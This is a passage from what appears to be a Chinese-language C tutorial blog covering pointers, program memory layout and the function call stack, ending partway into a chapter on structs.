位大小的指针 大指针(Huge)：类似于远指针。 空指针 在声明期间将 NULL 分配给指针的指针称为 空 (NULL) 指针，例如\n#include \u0026lt;stdio.h\u0026gt; void main() { int *var = NULL; printf(\u0026quot;address of var is: %p\\n\u0026quot;,var); } 空指针不能解引用：NULL指针因引用是一个非法的操作，在解引用之前，必须确保它不是一个NULL指针 空指针不能拷贝内容：strcpy(*p,\u0026quot;1111); 泛型指针 使用 void 关键字声明指针变量，可以接受任意一种类型的变量地址，如果需要使用泛型指针，需要强转为对应类型才可以使用。如下示例：\n#include \u0026lt;stdio.h\u0026gt; void main() { int a = 6666; void *p = \u0026amp;a; printf(\u0026quot;address of p is: %p\\n\u0026quot;, (int*) p); printf(\u0026quot;value of p is: %d\\n\u0026quot;, *(int*) p); } address of p is: 000000000061FE14 value of p is: 6666 野指针 野指针是指，没有有效地址的空间的指针，例如声明了指针变量没有对其赋值，这种情况下会出现 Segmentation fault 异常。\n#include \u0026lt;stdio.h\u0026gt; void main() { int *p; printf(\u0026quot;address of p is: %p\\n\u0026quot;, *p); } 再例如一个无效的地址空间也会发生 Segmentation fault 异常；例如下列赋值中，指针p赋值被视为一个内存地址，而不是变量的值，这个地址无效。\n#include \u0026lt;stdio.h\u0026gt; void main() { int *p; *p = 10000; printf(\u0026quot;address of p is: %p\\n\u0026quot;, *p); } 野指针出现场景：\n指针变量声明但未初始化 指针释放后未置空 指针操作超出变量作用域 避免野指针的出现：\n初始化置 NULL 释放后置 NULL 悬空指针 悬空指针是指”已经被释放的内存“的指针变量，此时这个地址空间是无效的。如下所示\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void main() { int *P=(int *)malloc(sizeof(int)); int a=5; P=\u0026amp;a; free(P); printf(\u0026quot;After deallocating its memory *p=%d\u0026quot;, *P); } 指针的偏移量 指针步长是指指针在运算是偏移多少字节\n指针+1之后跳跃的字节数取决于指针的类型，int 4, char 1, struct struct长度\n指针解引用时需要转换成对应的数据类型，从而判断被解引用后的大小，* (int *) p 指针类型变量转换为指针int类型变量\n对于结构体指针来说，offsetof函数定位属性对应的偏移量\n#include\u0026lt;stddef.h\u0026gt; offsetof(\u0026lt;struct struct_name\u0026gt;, \u0026lt;obj_name\u0026gt;) 指针数组 在C语言中 数组是由两部分组成，数组名与数组本身。\n#include\u0026lt;stdio.h\u0026gt; void main() { int a[10] = {0}; a[1] = 20; for (int i=0; i\u0026lt; sizeof(a) / sizeof(a[0]); i++){ printf(\u0026quot;%d\\n\u0026quot;,a[i]); } printf(\u0026quot;arr %p = \u0026amp;arr %p\u0026quot;, a, \u0026amp;a[0]); } 上面例子中，变量a是一个数组，而变量a代表的是一个指向该数组第一个元素的地址，a=\u0026amp;a[0] ，这是一个const修饰的指针是不可以被改变的。\n可以看到变量a和 \u0026amp;a[0] 值是相同的，而一个const修饰的指针变量是不可改变的，故a不能被赋值，下列代码是不合法的。总结为：不允许将任何地址分配给数组变量\n#include\u0026lt;stdio.h\u0026gt; void main() { int a[10] = {0}; int b[1] = {0}; int c = 10; a = \u0026amp;b; a = \u0026amp;c; for (int i=0; i\u0026lt; sizeof(a) / sizeof(a[0]); i++){ printf(\u0026quot;%d\\n\u0026quot;,a[i]); } printf(\u0026quot;arr %p = \u0026amp;arr %p\u0026quot;, a, \u0026amp;a[0]); } 使用指针访问数组 上面知道了，数组变量指向的是数组的起始元素（第一个元素）的地址指针，那么通过指针可以对数组进行访问。\n因为 a = \u0026amp;a[0] 那么 a[0] = *a，由此可推导出下列公式：\n\u0026amp;a[1] = a+1 （取数组元素的地址） 那么 a[1] = *(a+1) （取数组元素的值） \u0026amp;a[2] = a+2 那么 a[2] = *(a+2) 这种情况下数组的访问就有四种方法\nArray VS Pointer [4] 数组名是常量，指针是变量 sizeof(array) 得到的是数组实际占用内存空间的字节数，sizeof(pointer) 是4/8 取决于操作系统 指针运算 左值和右值 [5] 了解对于指针运算前，需要对左值(lvalue)和右值(rvalue)进行了解\n左值：通常来说是在占有内存地址（即具有地址）的对象 具有存储数据的内力，例如变量 不能是函数，表达式，或常量 综合来说，左值可以是以下几种： 任何类型的变量：int, float, pointer, struct等 数组的下标表达式，如a[1] 括号内的表达式（指针） 指针的间接引用 常量（不可改变的左值） 通过指针访问对象属性或成员 (-\u0026gt; or .) 右值：在内存中没有占有内存地址的对象 返回不可改变的表达式或值，例如a+b是一个常量，函数运行结果是一个右值 左值的示例\n#include\u0026lt;stdio.h\u0026gt; void main() {\t// 声明变量a为int类型 int a; // a是一个左值，引用对象为int a = 1; // 左值a出现在右边的场景 int b = a; // 非法，a是左值 9 = a; // 左值，*p是指针，p就是值，*p+4是后面一个int类型的地址，是左值 int *p; int a = 10; p = \u0026amp;a; // 这里实际上是指针运算，p+0为自己，p存储指针 *p为值，那么a=10000,p=10000 *(p+0) = 10000; printf(\u0026quot;%p\\n\u0026quot;,a); printf(\u0026quot;%p\\n\u0026quot;,*p); printf(\u0026quot;%d\\n\u0026quot;,a); printf(\u0026quot;%d\\n\u0026quot;,*p); } 右值的示例\n// 声明变量a b int a = 1, b; // 非法，a+1为常量，不是左值 a + 1 = b; // 声明指针变量 p q int *p, *q; // *p, *q 为左值 *p = 1; // 合法，左值可以赋值 // 非法 - \u0026quot;p + 2\u0026quot; 是右值 p + 2 = 18; q = p + 5; // \u0026quot;p + 5\u0026quot; 是右值，合法 // 解引用表达式是左值 *(p + 2) = 18; p = \u0026amp;b; int arr[20]; // 数组元素访问arr[12] = *(arr+12) 所以是左值有效 struct S { int m; }; struct S obj; // obj and obj.m are lvalues // ptr-\u0026gt; 等于 (*ptr).m 是左值有效 一元表达式需要有左值，当a是左值\u0026amp;a才生效，12本身是一个右值，不能\u0026amp;12\nint a, *p; // a 和 *p都是左值 p = \u0026amp;a; // 合法，\u0026amp;a是常量为右值，p是左值 \u0026amp;a = p; // 缺少左值，非法 三元表达式是一个右值（C++是左值）\n( x \u0026lt; y ? y : x) = 10; // c无效，c++有效 左值 VS 右值\n左值为内存中可识别的对象，右值为一个常量（广义上，不是const） 左值可以在左边和右边，右值必须在右边 右值必须有左值才生效 指针运算可左可右，变量运算是右值 arithmetic [6] C语言中，指针支持四种算术运算符，吧地址当作数值进行算数运算\n运算符 说明 = 可以将值赋值给指针 + 从指针加整数值以指向不同的内存位置。 - 从指针中减去整数值以指向不同的内存位置 比较运算（==, !=, \u0026lt;, \u0026gt;, \u0026lt;= , \u0026gt;=） 仅比较两个指针地址，例如\npointer == NULL ++ 指针使用递增运算符将向前位移一位 \u0026ndash; 指针使用递减运算符将向后位移一位 当对指针变量进行递增和递减操作时，会改变指针变量本身所在地址空间 当对指针变量进行+-运算时，不会改变指针变量本身 指针数组 指针数组是指数组存储的内容是指针，即数组内所有的元素都是指针\n#include\u0026lt;stdio.h\u0026gt; void main() {\tint a = 10; int b = 20; int c = 30; int *arr[] = {\u0026amp;a, \u0026amp;b, \u0026amp;c}; } 指针数组本质也是一个多级指针，例如一个2D数组每行(rows) 存储的值是一列(colums)的地址\n#include\u0026lt;stdio.h\u0026gt; void main() {\tint a[] = { 10 }; int b[] = { 20 }; int c[] = { 30 }; int *arr[] = {a, b, c}; } Pointer VS Array sizeof sizeof(array) 返回数组中所有元素占用内存的大小 sizeof(pointer) 只返回指针变量本身用内存的大小 \u0026amp;运算符 数组名是 \u0026amp;array[0] 的别名，返回数组中第一个元素的地址 \u0026amp;pointer 返回指针的地址 指针变量可以赋值，而数组变量不可以 数组是收集了相同类型元素的集合，而指针是一个存储地址的变量 多级指针 [7] 一个指针用于存储变量的地址，而另一个指针用于存储第一个指针的地址，这种指针被称为多级指针 (Multi-Pointer or Pointer to Pointer)\n声明多级指针必须在指针变量名称前多家一个 ”*“\nint **p; 通过示例更好的了解多级指针\n#include \u0026lt;stdio.h\u0026gt; // C program to demonstrate pointer to pointer int main() { int var = 123; // pointer for var int *ptr1; // double pointer for ptr2 int **ptr2; // third pointer for ptr2 int ***ptr3; // storing address of var in ptr1 ptr1 = \u0026amp;var; // Storing address of ptr2 in ptr1 ptr2 = \u0026amp;ptr1; // Storing address of ptr3 in ptr2 ptr3 = \u0026amp;ptr2; // Displaying value of var using // both single and double pointers printf(\u0026quot;Value of var = %d\\n\u0026quot;, var ); printf(\u0026quot;Value of var using single pointer = %d\\n\u0026quot;, *ptr1 ); printf(\u0026quot;Value of var using double pointer = %d\\n\u0026quot;, **ptr2); printf(\u0026quot;Value of var using third pointer = %d\\n\u0026quot;, ***ptr3); return 0; } 输出结构\nValue of var = 123 Value of var using single pointer = 123 Value of var using double pointer = 123 Value of var using third pointer = 123 Note：\n多级指针，不能跨越定义，即二级指针必须拥有一级指针才可以 此时的 *ptr 可以是左值或右值 作为左值时，存储数据到该变量存储的地址空间内 作为右值时，取出该空间内的内容 #include \u0026lt;stdio.h\u0026gt; // C program to demonstrate pointer to pointer int main() { int var = 123; // pointer for var int *ptr1; // double pointer for ptr2 int **ptr2; // third pointer for ptr2 int ***ptr3; // storing address of var in ptr1 ptr1 = \u0026amp;var; // Storing address of ptr2 in ptr1 ptr2 = \u0026amp;ptr1; // Storing address of ptr3 in ptr2 ptr3 = \u0026amp;ptr2; // Displaying value of var using // both single and double pointers ***ptr3 = 100; printf(\u0026quot;l-value test, the result of value = %d\\n\u0026quot;, var ); printf(\u0026quot;l-value test, the result of ptr1 = %d\\n\u0026quot;, *ptr1); printf(\u0026quot;l-value test, the result of ptr2 = %d\\n\u0026quot;, **ptr2); printf(\u0026quot;l-value test, the result of ptr3 = %d\\n\u0026quot;, ***ptr3); var = (***ptr3+1); printf(\u0026quot;r-value test, the result of value = %d\\n\u0026quot;, var ); return 0; } 输出结果为\nl-value test, the result of value = 100 l-value test, the result of ptr1 = 100 l-value test, the result of ptr2 = 100 l-value test, the result of ptr3 = 100 r-value test, the result of value = 101 指针和函数 指向普通数据类型的指针 指针可以被当作函数参数传递，会改变原有的变量值\n#include \u0026lt;stdio.h\u0026gt; void swap(int *n1, int *n2); int main() { int num1 = 5, num2 = 10; // address of num1 and num2 is passed swap( \u0026amp;num1, \u0026amp;num2); printf(\u0026quot;num1 = %d\\n\u0026quot;, num1); printf(\u0026quot;num2 = %d\u0026quot;, num2); return 0; } void swap(int* n1, int* n2) { int temp; temp = *n1; *n1 = *n2; *n2 = temp; } 指向函数的指针 [8] C语言中，指针也可以被指向一个函数，下面代码是一个指向函数的指针\n#include \u0026lt;stdio.h\u0026gt; // 定义一个无返回值的常规函数 void fun(int a) { printf(\u0026quot;Value of a is %d\\n\u0026quot;, a); } int main() { // fun_ptr是一个指针类型，他指向函数fun的地址 void (*fun_ptr)(int) = \u0026amp;fun; /* 也可以写为如下代码 void (*fun_ptr)(int); fun_ptr = \u0026amp;fun; */ // 调用指向函数的指针 (*fun_ptr)(10); return 0; } 声明指针函数函数的说明，通常情况下声明函数语法为 int foo(int); 则代表声明了一个foo函数，具有int类型参数和int类型的返回值，而在中间加一个 ”*\u0026quot; 则可以表示一个指针函数的定义 int * foo(int); 这种类型是错误的。\n因为在c语言中，* 的优先级要高于 ()， 上面说到的情况则表示了声明一个foo函数，int类型的参数和 *int 类型的返回值。所以必须使用 () 改变其优先级\nint (*foo)(int); 函数指针数组 函数指针数组是指元素为函数指针的数组，有些特殊的地方是，定义时不能定义为数组指针，需要定义为函数指针，函数指针数组也可以替代switch\n#include \u0026lt;stdio.h\u0026gt; void add(int a, int b) { printf(\u0026quot;Addition is %d\\n\u0026quot;, a+b); } void subtract(int a, int b) { printf(\u0026quot;Subtraction is %d\\n\u0026quot;, a-b); } void multiply(int a, int b) { printf(\u0026quot;Multiplication is %d\\n\u0026quot;, a*b); } int main() { // fun_ptr_arr is an array of function pointers void (*fun_ptr_arr[])(int, int) = {add, subtract, multiply}; unsigned int ch, a = 15, b = 10; printf(\u0026quot;Enter Choice: 0 for add, 1 for subtract and 2 \u0026quot; \u0026quot;for multiply\\n\u0026quot;); scanf(\u0026quot;%d\u0026quot;, \u0026amp;ch); if (ch \u0026gt; 2) return 0; (*fun_ptr_arr[ch])(a, b); return 0; } 关于函数指针的说明：\n普通指针指向的数据，函数指针指向的是代码 函数名代表函数的地址 函数去指不用加取址符 “\u0026amp;”，函数指针变量调用不用加“ * ” 函数指针可以作为参数，也可以作为返回值 数组与函数 数组作为参数时：数组作为函数参数传入时，传递不再是整个数组，而是数组的第一元素的地址，也就是指针，此时不能用size()获取数组的元素，获取到的时指针类型的大小。 数组作为返回值时：不允许返回数组，返回的是数组第一个元素指针，sizeof() 查看的大小也是指针类型的大小 main函数的参数 在C语言中main()函数之前提供了一个函数 _start()，但通常情况下 main() 是作为程序执行的第一个函数。main() 函数提供了两个参数，argc 和 argv 。\nargc 命令行传入的参数数量，int类型 argv 命令行传入的实际参数，参数索引从1开始，0为程序本身名称 正常情况下声明main函数： main(int argc, char *argv[]) **argv 是 *argv[] 的另一种表现方式 main(int argc, char **argv) Notes：这里有一个比较难理解的地方就是二级指针作为形参来替换指针数组。\n由于二级指针变量存放为一个一级指针的地址，而数组名本身是数组首元素的地址，其后的每一个元素都是指针就是将首元素指针传入。由于上面讲到数组作为参数传入时传入的是指针而不是数组本身。所以 *argv[] 与 **argv 是等价的。\nReference [1] c pointer\n[2] pointer type\n[3] const pointer\n[4] pointer VS array\n[5] lvalue VS rvlaue\n[6] pointer arithmetic\n[7] pointer to pointer\n[8] function pointer in c\n","permalink":"https://www.oomkill.com/2022/09/ch05-pointer/","summary":"","title":"ch05 指针"},{"content":"Overview 在编写程序时包含任意指令如，已初始化和未初始化数据，局部变量，函数等都是用于动态分配内存的指令。当程序编译后（默认生成 x.out 文件）这是一个可执行的链接文件( Executable and linking format)。在执行时这些不组织成几部分，包含不同的内存分段 (segments)\nELF：这是系统中标准二进制格式，其一些功能包含，动态链接，动态加载，对程序运行时控制。\n可以使用 size {ELF_file} 查看被分配的每个段的大小（Linux操作系统）；\ndec 列给出的是这个程序 text + data + bss 段的总大小，用十进制表示 text 段是存储可执行命令的段 data 段包含所有初始化数据，全局与静态变量 BSS 段包含未初始化数据 $ size 1 text data bss dec hex filename 1843 584 8 2435 983 1 Memory Layout in C [1] 在C语言中内存布局模型包含六个部分\n命令行参数 (Command Line Arguments) 栈 (Stack) 堆 (Heap) 未初始化数据段 (Uninitialized Data Segment BSS) 已初始化数据段 (Initialized Data Segment) 文本/代码段 (Text/Code Segment) 这6部分结构可以再划分为两种类型：\n静态内存结构 (Static Memory Layout)：包含代码段, 数据段 动态内存结构 (Dynamic Memory Layout)：包含栈, 堆 通过Overview中可以看到可以执行文件包含一些段，而缺少一些段，这部分是由运行时构建出来的。\n整个C程序的内存布局为下图所示\n图：memory layout C Source：https://hackthedeveloper.com/memory-layout-c-program/\n静态内存布局 静态内存布局中，包含代码段(Code Segment)，数据段(Data Segment)；数据段中又分为已初始化段，通常称为数据分段(DS)，未初始化分段(BSS)。\n代码段 代码段包含可执行的机器指令，这部分包含了程序的逻辑，为了防止堆, 栈的溢出，代码段在内存结构中处于布局中最下方。而且为了防止指令被修改，这部分是只读的。\n已编译二进制文件 只读段，防止程序被修改 可共享 可以通过 objdump -S \u0026lt;file\u0026gt; 来导出代码段中存的汇编代码\n已初始化数据段 所有已初始化的静态变量和全局变量都被存储在DS中，该段具有写权限，程序可以在运行时修改该段中变量的值。\n定义一个C程序，通过size观看其data段的大小\n#include \u0026lt;stdio.h\u0026gt; char main() { return '1'; } size输出为528\n$ size 1 text data bss dec hex filename 1358 528 8 1894 766 1 通过增加两个变量，一个全局变量一个静态变量，观看编译后可执行文件data段的大小与之前大小相比较\n#include \u0026lt;stdio.h\u0026gt; static int a = 10; // int 类型占4byte char b = 'a'; // char 类型占1byte char main() { return '1'; } size查看data输出值为533 与之前 528 增加 5 bytes，与定义的类型相符合\nsize 1 text data bss dec hex filename 1358 533 3 1894 766 1 未初始化数据段 未初始化数据段包含如下内容\n未初始化的全局和静态变量 初始化为0或空指针的变量 接着上述例子，添加两个变量，一个不初始化值，一个初始化为0\n#include \u0026lt;stdio.h\u0026gt; int a; static int b=0; char main() { return '1'; } 通过 size 命令可以看出，这些都被分配到 BSS 部分\n$ size 1 text data bss dec hex filename 1358 528 16 1902 76e 1 对于初始化段与未初始化段和只读数据段 (.rodata) 都会被分配到数据段中\n动态内存布局 动态内存是指程序运行时创建的的内存\nheap 堆段是由BSS往上更高部分动态内存分配的段，heap段具有以下特点\n程序运行可以没有heap段\nheap位于在BSS之上stack之下，与stack成反方向增长和减少\n运行时分配内存\n由函数 malloc() , calloc() , free() 等函数管理\nheap段内存由进程中共享库和动态模块等共享内存\nheap对于stack来说，最大的特点就是没有自动的内存管理功能，所有内存的申请和销毁都是通过开发者自行定义的，C中的Glibc API 提供了申请和销毁heap内存的功能。\n函数 malloc() / calloc() 用户空间实现的库函数，用于申请heap内存，可用于windows/linux 函数 free() 释放由 malloc() / calloc() 申请的内存 brk() / sbrk() 是linux下的系统调用，在内核空间实现的库函数 下列代码为heap内存分配示例\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int func() { int a = 10; int *aptr = \u0026amp;a; int *ptr = (int *)malloc(sizeof(int)); *ptr = 20; printf(\u0026quot;Heap Memory Value = %d\\n\u0026quot;, *ptr); printf(\u0026quot;Pointing in Stack = %d\\n\u0026quot;, *aptr); free(ptr); } int main() { func(); return 0; } 下图为上述代码的图形化布局，通过申明一个指针变量 *ptr 指向了通过函数 malloc() 申请的 heap内存\nNotes: heap变量的存储实际存储时在物理内存上，而heap,stack.. 都是虚拟内存中某个进程的地址空间，通过MMU将其转为物理地址进行读写。[2]\n图：heap layout of C Source：https://hackthedeveloper.com/memory-layout-c-program/\nstack stack是与heap相邻的地区，并与heap以反方向增长，当遇到heap时表示可用内存耗尽。stack段具有如下特点：\n程序运行必须拥有的内存段 以先进先出 (LIFO) 的顺序添加和移除数据 包含以下内容 所有局部变量 函数参数（逆序） 函数调用的返回地址 基于指针的函数调用 stack段自动分配和销毁内存，开发者无法控制stack段内存 当函数执行完函数局部变量会从stack中弹出释放，也就是局部变量的作用域范围 例如\n#include int sum(int a, int b) { return a + b; } float avg(int a, int b) { int s = sum(a, b); return (float)s / 2; } int main() { int a = 10; int b = 20; printf(\u0026quot;Average of %d, %d = %f\\n\u0026quot;, a, b, avg(a, b)); return 0; } 下图是上述代码对于stack内存段执行时的说明，如图所示，整个如下：\n当main函数被执行时会被压入stack中 main函数会调用avg函数求平均值，此时avg被压入stack avg执行sum函数，sum被压入stack 此时正在执行的帧时位于最顶层的，被称为基指针 (base pointer) 栈帧指向stack段顶部，存储stack最顶部地址 s是一个指针保存着sum的位置，即sum函数的结尾，依次类推 图：stack layout of C Source：https://hackthedeveloper.com/memory-layout-c-program/\n栈异常 栈异常常见异常情况有\n栈溢出 (Stack Overflow)：栈溢出是指超出stack的大小，例如很长的函数调用，造成该错误原因如下： 递归函数调用 大数据声明 栈毁坏 (Stack Corruption)：是指stack段中的某些内存位置由于错误的编码而被无意访问，导致内存位置发生变化。由于数据毁坏位置发生在Stack段因此被称为 “Stack Corruption” [4] 例如下面代码模拟了一个 SC 异常\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int copy(char *argv) { char name[10]; strcpy(name, argv); } int main(int argc, char **argv) { copy(argv[1]); printf(\u0026quot;Exit\\n\u0026quot;); return 0; } 输出结果为：可以看到当char大小大于10，会覆盖其他stack位置，使程序无法继续执行从而输出“Exit”。\n$ gcc .\\1.c -o 1.exe $ .\\1.exe testargs Exit $ .\\1.exe testargs000000000000000000 Stack VS Heap [3] Stack与Heap都存储与RAM中 Stack自动管理内存，而Heap则需要手动申请和取消 Stack分配速度快（一段程序启动时预先分配好的连续内存），而Heap分配速度较慢（动态分配的非连续内存） Stack在使用是会出现溢出问题，而Heap可以分配大数据 Stack常见错误为内存溢出，Heap常见错误为内存泄漏 Stack 和 Heap 的一些常见问题\n默认Stack大小为多少：Linux中通过 ulimit -s 可以查看 默认的Heap大小为多少：没有默认的Heap大小，在32位操作系统中，每个进程可以看到连续的4GB空间，这个空间没有被映射到物理地址中，而是根据使用情况进行映射，在64位操作系统中，这个空间会更大 stack和heap存放在哪里？：在虚拟内存中，通过MMU进行映射到物理地址上 如何手动配置heap？：可以使用 ulimit -v 设置虚拟内存的大小 函数调用栈 函数调用与栈有不可密切的关系，在一个函数调用过程所需要的信息一般包括以下几个方面：\n函数返回地址 函数参数 变量 保存的上下文 ：包括在函数调用前后需要保持不变的寄存器。 当在调用一个函数时，控制流从调用函数转移到被调用函数。如下列代码在运行时产生了如下几项疑问：\n函数参数和用于调用函数的变量的区别 为什么具有多个相同名称但位于不同函数中的变量可以共存？ 为什么函数doing有一定的限制？ 为什么未初始化的局部变量可能包含任何值？ #include \u0026lt;stdio.h\u0026gt; int mogrify(int a, int b){ int tmp = a*4 - b / 3; return tmp; // (mogrify函数返回值) } double truly_half(int x){ double tmp = x / 2.0; return tmp; } int main(){ int a = 7, y = 17; int mog = mogrify(a,y); // 调用mogrify printf(\u0026quot;Done with mogrify\\n\u0026quot;); double x = truly_half(y); // 调用truly_half printf(\u0026quot;Done with truly_half\\n\u0026quot;); a = mogrify(x, mog); // 第二次调用mogrify printf(\u0026quot;Results: %d %lf\\n\u0026quot;,mog,x); // (last_print) return 0; // (main函数返回) } 输出\nlila [stack-demo-code]% gcc simple_calls.c lila [stack-demo-code]% ./a.out Done with mogrify Done with truly_half Results: 23 8.500000 栈行为 [4] main函数的调用\n上述代码调用stack发生的变化，程序从第一行的 main() 函数开始。 main() 有 3 个局部变量：a,y 是int，x 是double。栈的初始状态如下表（其中地址栏为虚构地址）\nMethod Line Var Value Addr Notes main() 12行开始 a ? 1024 y ? 1028 mod ? 1032 x ? 1036 表1\nmain函数的第一行被执行\n在运行 main（从第 12 行开始）时，会为所有局部变量分配了栈空间，但没有定义值（随机被初始化）在向下移动时，为局部变量a,y 定义了值。\nMethod Line Var Value Addr Notes main() 13行 a 7 1024 y 17 1028 mod ? 1032 x ? 1036 表2\nmogrify()被调用 在第13行时产生一个函数调用，main函数被暂停，至函数 mogrify 完成。函数调用使一个栈push到调用栈，如下表所示。\nMethod Line Var Value Addr Notes main() 13行 a 7 1024 y 17 1028 mod ? 1032 x ? 1036 mogrify() 4行 a 7 1044 b 17 1048 tmp ? 1052 表3\nmogrify()第一行被执行 此时从 mogrify 的第一行开始，完成后返回至 main 函数，将在第 13 行继续执行。表3中由于没有执行到tmp，所以还没被分配值。\n表4是 完成mogrify 函数执行，局部变量 tmp 被赋值。\nMethod Line Var Value Addr Notes main() 13行 a 7 1024 y 17 1028 mod ? 1032 x ? 1036 mogrify() 5行 a 7 1044 b 17 1048 tmp 23 1052 表4\nmogrify()函数返回\nmogrify函数返回在这里有两个作用：\n返回值被存储在调用函数位置：main函数 （第 13 行）变量 mog 中。 弹出栈帧，从调用堆栈中移除。 此时状态为表5\nMethod Line Var Value Addr Notes main() 14 a 7 1024 y 17 1028 mod 23 1032 x ? 1036 表5\n执行Printf()\nMethod Line Var Value Addr Notes main() 13行 a 7 1024 y 17 1028 mod ? 1032 x ? 1036 printf() lib call format ? 1044 pointer 表6\nprintf()也是作为函数，将另一个栈帧推入栈中，并为其参数和局部变量预留空间。 printf()是一个可变参数的函数。\n第二次函数调用\n从第 16 行起，调用了函数 truly_half 此时会将一个栈帧推入调用栈。此时状态如表5相同\n调用函数truly_half()\n当函数 truly_half() 被调用，对应的栈帧被push到main的栈帧下，表7中所示的地址（局部变量）与之前 mogrify() 函数是相同的地址，这是因为栈中的空间是可重用的。\nMethod Line Var Value Addr Notes main() 16 a 7 1024 y 17 1028 mog 23 1032 x ? 1036 truly_half() 8 x 17 1044 tmp ? 1048 表7\ntruly_half()被执行\n执行 truly_half 函数的第二行返回计算后的值来赋值给 main 中的局部变量 x，并从调用栈中弹出 truly_half 的栈帧，如表8所示\nMethod Line Var Value Addr Notes main() 16 a 7 1024 y 17 1028 mog 23 1032 x ? 1036 truly_half() 9 x 17 1044 tmp 8.5 1048 表8\n返回main函数控制流\nmain函数中会打印这个值，此时内存结构为表8所示\nMethod Line Var Value Addr Notes main() 17 a 7 1024 y 17 1028 mog 23 1032 x 8.5 1036 表9\n再次调用函数mogrify()\n此时，main函数在第19行暂停，在 mogrify() 第一行开始。\n需要注意的一点是 mogrify() 参数类型是int，这里会强制转换 8 字节double 为一个 4 字节的int，小数点被省去。如表10所示\nMethod Line Var Value Addr Notes main() 19 a 7 1024 y 17 1028 mog 23 1032 x 8.5 1036 double mogrify() 4 a 8 1044 convert to int b 23 1048 tmp ? 1052 表10\nmogrify()被执行后：\nMethod Line Var Value Addr Notes main() 19 a 7 1024 y 17 1028 mog 23 1032 x 8.5 1036 double mogrify() 5 a 8 1044 convert to int b 23 1048 tmp 25 1052 表11\nmogrify()被执行后： mogrify() 执行完成后将结果分配给 main 函数中的局部变量 a 并弹出栈帧。此时数据如表12所示\nMethod Line Var Value Addr Notes main() 19 a 25 1024 a的值被覆盖 y 17 1028 mog 23 1032 x 8.5 1036 double 表12\n至此返回最开始的部分，一个函数的过程包含四个部分 (function call stack)\n函数调用栈 动态分配内存区域 (heap) 存储全局变量的区域 程序允许的实际代码(data text) 栈帧(stack frame) 指的是：栈内存中单个函数调用（正在允许的函数）的一部分内存块，（参数和局部变量）。编译器在编译期间确定函数的栈帧大小。栈上的栈帧通常与尚未返回的函数一样多。\n栈行为：\npushing ：当函数被调用时，新的帧被推到调用堆栈的 “顶部”。 popping：当函数执行完成，会将控制权返回给调用它的函数。并将函数关联的帧从栈顶部弹出。 溢出：如果在返回之前调用了太多函数（例如递归），程序可能会耗尽栈空间。\n关于栈的总结 C语言的执行模型 C 语言是过程式编程，不支持在函数之外编写代码 C 语言的执行模型是指函数调用工作原理（函数调用栈行为分析的）及函数工作原理。 C 语言使用 ”栈“ 数据结构来实现函数与函数调用。 关于函数调用栈 函数调用栈是动态数据结构，用于参数传递、局部变量分配、保存调用的返回地址、保存寄存器以供恢复。\n栈向下增长，从较高的地址开始，向较低的地址。\nPush 将栈帧添加到栈，Pop从栈中弹出\n栈帧的增长在x86架构下是4字节：\n假设栈指位于1000，此时push一个函数，则该栈指指向996(1000 - 4) 假设此时弹出函数，那么会从996处从栈中弹出，并递增并指向地址1000 调用惯例 [6] 调用惯例 (Calling Conventions) 是指函数调用的标准化方法，当在函数调用时例如，如何将参数传递给子程序？子程序可以覆盖寄存器中的值，还是调用者希望保留寄存器内容？子程序中的局部变量应该存储在哪里？函数应该如何返回结果？\nC语言中调用惯例在很大程度上使用了基于硬件支持栈。对C中调用惯例的理解就需要对函数执行模型的理解（应确保完全理解 push、pop、call 和 ret 指令的行为）。在此调用约定中，子程序参数在stack上传递。寄存器保存在stack上，子程序使用的局部变量放在stack上的内存中。\ncdecl (c declaration)：C/C++默认调用约定，调用时按照从右向左的参数入\npush arg3 ; rightmost argument push arg2 push arg1 ; leftmost argument call f add esp, 12 ; 12 = 3 arguments each being 4 bytes fastcall：通过寄存器传递值（从右到左）\nthiscall：指针类型被存储在寄存器 ecx ，其他类型放置堆栈\nReference [1] memory layout c program\n[2] stack and heap locations in ram\n[3] what and where are the stack and heap\n[4] understanding stack corruption c\n[5] static\n[6] calling convention\n","permalink":"https://www.oomkill.com/2022/09/ch06-memory-layout/","summary":"","title":"ch06 内存布局"},{"content":"Overview C语言中复合类型 (composite type) 是指用户自定义类型，通常由多种元素组成的类型，其元素被紧密存储在内存中。C语言常见的复合类型有：\n数组 字符串 结构体 联合类型 结构体 [1] 结构体 (structure) 是指用户定义的数据类型，允许将不同类型的多个元素组合在一起，来创建出更复杂的数据类型，类似于数组，但又区别于数组，数组只能保存同类型的元素，而结构体可以保存不同类型的元素。\n定义 声明结构体的语法如下\nstruct structureName { dataType memberVariable1; datatype memberVariable2; ... } variable01, variable02...; 这里需要注意的一些地方：\nstruct是关键字，structureName定义的新数据类型，variable{}是作为使用 structureName 声明的新变量名 每个成员方法结尾都是 “;\u0026quot; 而不是逗号 ”,\u0026quot; 结构体不能递归 变量可以有多个 例如声明一个学生的结构体，而student是作为一个新的数据类型存在\nstruct student { char name[20]; int roll; char gender; }; Notes：在定义（创建）结构体变量前，结构体成员不会占用内存\n声明 使用结构体声明变量\n也可以一次性定义结构体和声明变量\nstruct student { char name[20]; int roll; char gender; } stu1,stu2; // 结构体名称可以省略 struct { char name[20]; int roll; char gender; } stu1,stu2; 赋值 在声明结构体后，student结构体只是自定义数据结构，要使用还需要进行初始化，或者赋值\nstu1 = {\u0026quot;zhangsan\u0026quot;, 20, 0}; 或者\nstu1.name=\u0026quot;zhangsan\u0026quot;; 或者\nstruct Student { char name[25]; int age; char branch[10]; char gender; }stu1 = {\u0026quot;zhangsan\u0026quot;, 20, 0}; 或者使用不同顺序进行初始化\nstu1 = {.age=20, .gender=0, .name=\u0026quot;zhangsan\u0026quot;}; 也可以仅初始化部分成员，未初始化的成员应该按顺序在后位\nstu1 = {\u0026quot;zhangsan\u0026quot;}; 访问 访问结构体可以使用符号 ”.“ 来访问，成员名称==.==成员属性\n#include\u0026lt;string.h\u0026gt; struct Student { char name[25]; int age; char branch[10]; char gender; }; int main() { struct Student s1; s1.age = 18; strcpy(s1.name, \u0026quot;Viraaj\u0026quot;); printf(\u0026quot;Name of Student 1: %s\\n\u0026quot;, s1.name); printf(\u0026quot;Age of Student 1: %d\\n\u0026quot;, s1.age); return 0; } 也可以使用scanf() 赋值\n结构体运算 结构体不能够执行算术运算符 +, -, x, ÷ ，关系运算符 \u0026lt; \u0026gt; \u0026lt;= \u0026gt;=, 等式运算符，但是可以在两个相同结构体变量的场景下进行赋值运算。\n/* 无效的操作 */ st1 + st2 st1 - st2 st1 